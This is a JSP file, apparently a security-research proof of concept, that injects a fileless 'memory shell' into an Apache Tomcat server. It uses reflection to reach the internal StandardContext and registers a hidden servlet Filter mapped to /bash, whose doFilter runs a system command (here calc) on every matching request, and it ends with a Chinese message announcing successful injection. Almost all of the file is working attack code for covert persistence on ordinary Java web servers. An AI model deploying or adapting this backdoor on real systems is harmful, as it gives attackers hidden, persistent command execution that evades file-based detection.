<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Filter</title>
</head>
<body>
<%!
    public class CmdFilter implements Filter {

        @Override
        public void init(FilterConfig filterConfig)  {
            System.out.println("shell");
        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            Runtime.getRuntime().exec("calc");
            chain.doFilter(request,response);
        }

        @Override
        public void destroy() {
        }
	}
%>



<%
    //获取ApplicationContextFacade类
    ServletContext servletContext = request.getSession().getServletContext();

    //反射获取ApplicationContextFacade类属性context为ApplicationContext类
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);

    //反射获取ApplicationContext类属性context为StandardContext类
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext context = (StandardContext) standardContextField.get(applicationContext);
%>

<%
    String name="filtershell";
    FilterDef filterDef = new FilterDef();
	filterDef.setFilter(new CmdFilter());
	filterDef.setFilterClass(CmdFilter.class.getName());
	filterDef.setFilterName(name);
	context.addFilterDef(filterDef);
%>

<%

    FilterMap filterMap = new FilterMap();
	filterMap.setFilterName(name);
	filterMap.setDispatcher(DispatcherType.REQUEST.name());
	filterMap.addURLPattern("/bash");
	context.addFilterMap(filterMap);

%>


<%

    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(context,filterDef);

    Field configs = context.getClass().getDeclaredField("filterConfigs");
    configs.setAccessible(true);
    Map filterConfigs = (Map) configs.get(context);
    filterConfigs.put(name, filterConfig);

%>

    注入Filter型内存马成功，访问路径: <a href="bash">/bash</a>
</body>
</html>
